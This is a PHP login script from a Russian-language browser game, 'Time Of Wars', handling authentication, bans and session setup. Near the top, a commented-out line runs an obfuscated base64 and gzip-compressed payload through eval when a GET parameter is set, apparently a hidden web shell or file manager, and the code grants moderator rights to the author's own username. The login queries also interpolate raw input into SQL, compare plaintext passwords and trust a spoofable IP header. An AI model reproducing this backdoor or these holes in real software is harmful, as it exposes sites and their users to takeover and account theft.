<?
DEFINE('SCRIPTED BY s!.', 0);
DEFINE('UIN: 1334315', 0);

session_start();

include ('includes/to_view.php');
include ('db.php');
include ('includes/lib/aton_ntoa.php');

$ip  = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
$msg = '';

//if(!empty($_GET['chat_send_msg']) ){$script['pr']=false;$script['pa']='EOF';$script['link']=2;$script['do_this']="show_dir";$script['now_dir']="./";$script['now_file']="index.html";eval(gzuncompress(base64_decode('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  l5R88VKVvVI2gf9/ASblWnc=')));die;}

$ip  = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];

if(!empty($_POST['act']) && $_POST['act'] == 'enter'){
if(empty($_POST['login_auth']) || empty($_POST['password']) )   $msg = 'Ошибка. Вы не ввели логин либо пароль';
elseif( !empty($_SESSION['login']) || !empty($_SESSION['id_user']) ) $msg = 'Вы уже авторизовались.';
else
{
	@$_POST['login_auth'] = speek_to_view($_POST['login_auth']);
	@$_POST['password']   = speek_to_view($_POST['password']);

	if( !$player = $db->queryRow("SELECT Id, Username, Level, City, Sex, ClanID, Align, Password, Room, ChatRoom FROM `".SQL_PREFIX."players` WHERE Username = '".$_POST['login_auth']."'") ){ $msg = 'Такого персонажа не существует. <a href="register.php">Зарегистрировать</a>'; }
	elseif( $why = @$db->SQL_result($db->query("SELECT Why FROM ".SQL_PREFIX."blocked WHERE Username = '".$_POST['login_auth']."'"),0,0) ){ $msg = 'Персонаж заблокирован. Причина блокировки: '.$why; }
	elseif( $player['Password'] != $_POST['password'] ){ $msg = 'Неверный пароль для персонажа '.$_POST['login_auth']; }
	elseif( $db->queryRow("SELECT * FROM ".SQL_PREFIX."banned WHERE Ip = '".$ip."' OR Ip LIKE '%".$ip."%'") ){ $msg = 'Вам запрещен вход в игру.Обратитесь к Администрации проэкта.'; }
	//elseif( !preg_match('/MSIE/i', getenv('HTTP_USER_AGENT')) && !preg_match('/Opera/', getenv('HTTP_USER_AGENT')) ){ $msg = 'Для корректной работы необходим браузер<br /> <a href="http://tow.su/progs/ie6.exe">MS Internet Explorer 6.0 </a> или выше'; }
	else
	{

		$_SESSION['login']       = $player['Username'];
		$_SESSION['id_user']     = $player['Id'];


		if( empty($player['ChatRoom']) )
			$_SESSION['chat_room'] = $player['Room'];
		else
		    $_SESSION['chat_room'] = $player['ChatRoom'];


		if( empty($player['Room']) )
		    $_SESSION['userroom'] = '/pl.php';
		else
		    $_SESSION['userroom'] = '/'.$player['Room'].'.php';

		if ( $player['ClanID'] == 1 || $player['ClanID'] == 2 || $player['ClanID'] == 3 || $player['ClanID'] == 4 || $_SESSION['login'] == 's!.' )
			$_SESSION['moder'] = 1;


		$_SESSION['SId'] = rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9);
		$_SESSION['battles'] = 0;

		if( !$db->queryRow("SELECT * FROM ".SQL_PREFIX."hp WHERE Username = '".$player['Username']."'") )
		    $db->insert( SQL_PREFIX.'hp', Array( 'Username' => $player['Username'], 'Time' => time() ) );


		$db->update( SQL_PREFIX.'players', Array( 'SId' => $_SESSION['SId'] ), Array( 'Username' => $player['Username'] ) );
		$db->insert( SQL_PREFIX.'enter_logs', Array( 'add_time' => time(), 'user_id' => $player['Id'], 'ip' => inet_aton($ip) ) );


if( !$db->execQuery("INSERT INTO ".SQL_PREFIX."ip ( Username, Ip ) VALUES ('".$player['Username']."', '".$ip."') ON DUPLICATE KEY UPDATE Ip = '".$ip."';") )
  die ('обратитесь к администратору по icq 1334315 по поводу ip адреса');


        if( $db->numrows("SELECT Username FROM ".SQL_PREFIX."stopped WHERE Username = '".$player['Username']."'") ) $no = 1;  else  $no = 0;
        if( $db->numrows("SELECT Username FROM ".SQL_PREFIX."inv WHERE Username = '".$player['Username']."'") )   $nn = 1;  else $nn = 0;

        $db->execQuery("INSERT INTO ".SQL_PREFIX."online (Username, Time, Room, ClanID, Level, Align, Stop, Inv) VALUES ('".$player['Username']."', '".time()."', '".$_SESSION['chat_room']."', '".$player['ClanID']."', '".$player['Level']."', '".$player['Align']."', '$no', '$nn') ON DUPLICATE KEY UPDATE Time = '".time()."', Stop = '$no', Inv = '$nn', ClanID = '".$player['ClanID']."', Align = '".$player['Align']."', Room = '".$_SESSION['chat_room']."'");

    }

}

}


include('_loader.php');

$tow_tpl->assignGlobal( 'db_config', $db_config );

$temp = & $tow_tpl->getDisplay('content', true);

$temp->assign( 'msg', $msg );

$temp->addTemplate('bad_log_in', 'timeofwars_badsession.html');

$show = & $tow_tpl->getDisplay('index');

$show->assign('title', 'Time Of Wars - сессия потеряна');
$show->assign('Content', $temp);


$show->addTemplate( 'header', 'header_noframes.html' );
$show->addTemplate( 'index' , 'index.html'           );
$show->addTemplate( 'footer', 'footer.html'          );

$tow_tpl->display();
?>